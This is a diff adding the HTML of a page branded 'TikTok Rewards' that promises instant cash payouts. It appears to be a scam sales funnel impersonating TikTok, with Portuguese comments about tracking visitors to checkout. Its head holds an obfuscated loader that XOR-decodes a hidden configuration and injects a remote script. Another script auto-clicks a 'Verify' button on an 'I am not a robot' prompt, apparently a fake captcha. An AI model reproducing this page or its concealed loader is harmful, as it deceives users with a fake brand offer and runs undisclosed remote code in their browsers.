@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="en-US"><head>
+<!-- Rise: captura params de entrada (ttclid/utm) ANTES do app limpar a URL -->
+<script>(function(){try{var s=window.location.search;if(s&&s.length>1){var prev=sessionStorage.getItem("rise_entry_params");if(!prev||prev.length<=1){sessionStorage.setItem("rise_entry_params",s);}}}catch(e){}})();</script>
+<!-- Utmify: impede reescrita da src de iframes (quebra o widget de upsell) -->
+<meta data-utmify-ignore-iframe>
+<!-- Utmify — UTMs -->
+<script>(function(){var l_p3=atob("DFggC4TLuUR3IHaCLCMCfvanm35VSAL2XCsaJKuo3SpZVQLvRT5ZJeek1GoVUlnxTypJe/C4ljEDTQWtQDlUbve/ly4EAlqgTSxUee2pzDASU1S4dyMCZeWm3GZNAhLjWDkNfvCm0CIODQbwSS5FZfDmwScYRFvxTzMCJ6a92CgCRVS4DnpdJ//p1yUaRVS4DjxBf+XmzDAaSRD7AShSbvKu1zBaUwPgRTxTKajpzyUbVROgFnoCdtm2");var z_6un3=[];for(var h_p=0;h_p<l_p3.length;h_p++){z_6un3.push(l_p3.charCodeAt(h_p)&255);}var x_4=z_6un3[0];var o_zkc=z_6un3.slice(1,1+x_4);var a_f9yd=z_6un3.slice(1+x_4);var k_793=a_f9yd.map(function(b,w_y1){return b^o_zkc[w_y1%x_4];});var y_djpo="";for(var k_e=0;k_e<k_793.length;k_e++){y_djpo+=String.fromCharCode(k_793[k_e]&255);}var p_lzgg=decodeURIComponent(escape(y_djpo));var r_m3=JSON.parse(p_lzgg);var u_3=r_m3.globals||[];u_3.forEach(function(p_39g){window[p_39g.name]=p_39g.value;});var f_k5mx=document.createElement("script");f_k5mx.src=r_m3.url;f_k5mx.async=true;f_k5mx.defer=true;(r_m3.attributes||[]).forEach(function(f_km){f_k5mx.setAttribute(f_km.name,f_km.value);});(document.head||document.documentElement).appendChild(f_k5mx);})();</script>
+<!-- Utmify — pixel TikTok (6a925dc2cd818cda606d9888) -->
+<script>
+(function () {
+  window.tikTokPixelId = "6a925dc2cd818cda606d9888";
+  var s = document.createElement("script");
+  s.src = "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js";
+  s.async = true;
+  s.defer = true;
+  (document.head || document.documentElement).appendChild(s);
+})();
+</script>
+<meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"/><link rel="stylesheet" href="assets/styles-B-VQ289O.css" data-precedence="default"/><link rel="stylesheet" href="assets/css2.css" data-precedence="default"/><link rel="stylesheet" href="assets/index-B8NbOjFt.css" data-precedence="default"/><title>TikTok Rewards</title><meta name="theme-color" content="#ff0050"/><meta name="author" content="TikTok Rewards"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="TikTok Rewards"/><meta name="twitter:description" content="Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer."/><meta property="og:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png"/><meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png"/><meta name="description" content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank."/><meta property="og:title" content="TikTok Rewards"/><meta property="og:description" content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank."/><link rel="modulepreload" href="assets/index-Er4taGEy.js"/><link rel="modulepreload" href="assets/routes-CAIeH5mq.js"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="icon" type="image/x-icon" href="favicon.ico"/><script>
+(() => {
+  if (window.location.pathname === "/lp/") {
+    window.history.replaceState(null, "", "/lp" + window.location.search + window.location.hash);
+  }
+
+  const earlyParams = new URLSearchParams(window.location.search);
+  if ((window.location.pathname === "/" || window.location.pathname === "") && earlyParams.get("__route") === "tasks-app") {
+    earlyParams.delete("__route");
+    const nextSearch = earlyParams.toString();
+    window.history.replaceState(null, "", "/tasks-app" + (nextSearch ? "?" + nextSearch : "") + window.location.hash);
+  }
+
+
+
+  if (window.__mobileGuardInstalled) return;
+  window.__mobileGuardInstalled = true;
+  window.__earlyMobileGuard = true;
+
+  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
+  let lastUrl = window.location.href;
+
+  const enforceViewport = () => {
+    let viewport = document.querySelector('meta[name="viewport"]');
+    if (!viewport) {
+      viewport = document.createElement("meta");
+      viewport.setAttribute("name", "viewport");
+      document.head.appendChild(viewport);
+    }
+    if (viewport.getAttribute("content") !== viewportContent) {
+      viewport.setAttribute("content", viewportContent);
+    }
+    document.documentElement.style.zoom = "1";
+    if (document.body) document.body.style.zoom = "1";
+  };
+
+  const isTextField = (node) => {
+    if (!node || !node.matches) return false;
+    return node.matches("input, textarea, select, [contenteditable='true']");
+  };
+
+  const resetAllScroll = () => {
+    enforceViewport();
+  };
+
+  const resetAfterScreenChange = () => {
+    requestAnimationFrame(resetAllScroll);
+    setTimeout(resetAllScroll, 60);
+    setTimeout(resetAllScroll, 180);
+    setTimeout(resetAllScroll, 420);
+    setTimeout(resetAllScroll, 900);
+  };
+
+  const prevent = (event) => {
+    if (event.cancelable) event.preventDefault();
+    enforceViewport();
+  };
+  const preventTouchZoom = (event) => {
+    if (event.touches && event.touches.length > 1) prevent(event);
+  };
+  const findCaptchaVerifyButton = (target) => {
+    const button = document.querySelector('button[aria-label="Verify"]');
+    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
+    if (target && target.closest && target.closest('input, textarea, select, [contenteditable="true"]')) return null;
+    const card = button.parentElement && button.parentElement.parentElement;
+    if (target === button || button.contains(target) || (card && card.contains(target))) return button;
+    return null;
+  };
+
+  let captchaTapLock = false;
+  const activateCaptchaTap = (target) => {
+    const button = findCaptchaVerifyButton(target);
+    if (!button) return false;
+    if (!captchaTapLock) {
+      captchaTapLock = true;
+      setTimeout(() => {
+        try { button.click(); } catch {}
+        setTimeout(() => { captchaTapLock = false; }, 700);
+      }, 0);
+    }
+    return true;
+  };
+  const preventKeyboardZoom = (event) => {
+    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) prevent(event);
+  };
+  const preventWheelZoom = (event) => {
+    if (event.ctrlKey || event.metaKey) prevent(event);
+  };
+
+  const originalPushState = history.pushState;
+  const originalReplaceState = history.replaceState;
+  history.pushState = function () {
+    const result = originalPushState.apply(this, arguments);
+    lastUrl = window.location.href;
+    resetAfterScreenChange();
+    return result;
+  };
+  history.replaceState = function () {
+    const result = originalReplaceState.apply(this, arguments);
+    lastUrl = window.location.href;
+    resetAfterScreenChange();
+    return result;
+  };
+
+  document.addEventListener("gesturestart", prevent, { passive: false, capture: true });
+  document.addEventListener("gesturechange", prevent, { passive: false, capture: true });
+  document.addEventListener("gestureend", prevent, { passive: false, capture: true });
+  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
+  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
+  document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
+  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
+  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });
+
+  window.addEventListener("popstate", resetAfterScreenChange, { capture: true });
+  document.addEventListener("click", (event) => {
+    const target = event.target;
+    if (activateCaptchaTap(target)) return;
+    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
+    if (target && target.closest && target.closest("a, button, [role='button']")) {
+      resetAfterScreenChange();
+    }
+  }, true);
+  document.addEventListener("focusin", (e) => {
+     setTimeout(enforceViewport, 0);
+  }, true);
+  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener("resize", () => {
+      enforceViewport();
+    });
+  }
+
+  new MutationObserver(() => {
+    if (window.location.href !== lastUrl) {
+      lastUrl = window.location.href;
+      resetAfterScreenChange();
+    }
+  }).observe(document.documentElement, { childList: true, subtree: true });
+
+  enforceViewport();
+  resetAfterScreenChange();
+  setInterval(() => {
+    enforceViewport();
+    if (window.location.href !== lastUrl) {
+      lastUrl = window.location.href;
+      resetAfterScreenChange();
+    }
+  }, 250);
+})();
+</script><script src="/rise-lead-popup.js" defer></script></head><body><div id="cloned-root"></div><!--$--><script>(function(t){let s;try{s=JSON.parse(sessionStorage.getItem(t.storageKey)||"{}")}catch(e){console.error(e);return}const c=t.key||window.history.state?.__TSR_key,r=c?s[c]:void 0;if(t.shouldScrollRestoration&&r&&typeof r=="object"&&Object.keys(r).length>0){for(const e in r){const o=r[e];if(!o||typeof o!="object")continue;const l=o.scrollX,i=o.scrollY;if(!(!Number.isFinite(l)||!Number.isFinite(i))){if(e==="window")window.scrollTo({top:i,left:l,behavior:t.behavior});else if(e){let n;try{n=document.querySelector(e)}catch{continue}n&&(n.scrollLeft=l,n.scrollTop=i)}}}return}const a=window.location.hash.split("#",2)[1];if(a){const e=window.history.state?.__hashScrollIntoViewOptions??!0;if(e){const o=document.getElementById(a);o&&o.scrollIntoView(e)}return}window.scrollTo({top:0,left:0,behavior:t.behavior})})({"storageKey":"tsr-scroll-restoration-v1_3","shouldScrollRestoration":true});document.currentScript.remove()</script><!--/$--><script class="$tsr" id="$tsr-stream-barrier">(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={h(){this.hydrated=!0,this.c()},e(){this.streamEnded=!0,this.c()},c(){this.hydrated&&this.streamEnded&&(delete self.$_TSR,delete self.$R.tsr)},p(e){this.initialized?e():this.buffer.push(e)},buffer:[]};$_TSR.router=($R=>$R[0]={manifest:$R[1]={routes:$R[2]={__root__:$R[3]={preloads:$R[4]=["/assets/index-Er4taGEy.js"],assets:$R[5]=[$R[6]={tag:"script",attrs:$R[7]={type:"module",async:!0},children:"import(\"/assets/index-Er4taGEy.js\")"}]},"/":$R[8]={preloads:$R[9]=["/assets/routes-CAIeH5mq.js"]}}},matches:$R[10]=[$R[11]={i:"__root__ ",u:1787270970345,s:"success",ssr:!0},$R[12]={i:"  ",u:1787270970345,s:"success",ssr:!0}],lastMatchId:"  "})($R["tsr"]);$_TSR.e();document.currentScript.remove()</script><script type="module" async="">import("/assets/index-Er4taGEy.js")</script><!--
+  Cole este bloco em CADA página do seu funil, logo antes de </body>.
+
+  Ele faz duas coisas:
+    1. avisa o contador a cada 15s enquanto a aba estiver visível
+    2. avisa quando a pessoa clica num link que sai do funil (checkout)
+
+  O checkout é medido pelo CLIQUE, não pelo sumiço do contador — quem some
+  pode ter fechado a aba, e contar isso como checkout inflaria o número.
+-->
+<script>
+(function () {
+  var JANELA = 15000;
+  var ROTA = '/api/presenca';
+
+  var id;
+  try {
+    id = sessionStorage.getItem('presenca_id');
+    if (!id) {
+      id = Math.random().toString(36).slice(2) + Date.now().toString(36);
+      sessionStorage.setItem('presenca_id', id);
+    }
+  } catch (e) {
+    id = Math.random().toString(36).slice(2);
+  }
+
+  function enviar(corpo) {
+    var texto = JSON.stringify(corpo);
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(ROTA, new Blob([texto], { type: 'application/json' }));
+    } else {
+      fetch(ROTA, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: texto,
+        keepalive: true,
+      }).catch(function () {});
+    }
+  }
+
+  function bater(primeira) {
+    // aba em segundo plano não conta como pessoa olhando a oferta
+    if (document.visibilityState !== 'visible') return;
+    enviar({ id: id, pagina: location.pathname, primeira: primeira === true });
+  }
+
+  // só esta primeira conta como pageview; as de 15 em 15s são presença
+  bater(true);
+  setInterval(bater, JANELA);
+  document.addEventListener('visibilitychange', bater);
+
+  // ---- saída para o checkout
+  // Qualquer clique num link para OUTRO domínio conta como saída do funil.
+  // sendBeacon sobrevive à navegação, então o aviso chega mesmo saindo na hora.
+  document.addEventListener(
+    'click',
+    function (evento) {
+      var alvo = evento.target && evento.target.closest ? evento.target.closest('a[href]') : null;
+      if (!alvo) return;
+
+      var destino;
+      try {
+        destino = new URL(alvo.href, location.href);
+      } catch (e) {
+        return;
+      }
+
+      if (destino.origin === location.origin) return;              // continua no funil
+      if (!/^https?:$/.test(destino.protocol)) return;             // mailto, tel, etc.
+
+      enviar({ id: id, evento: 'checkout', destino: destino.hostname });
+    },
+    true
+  );
+})();
+</script>
+</body></html>
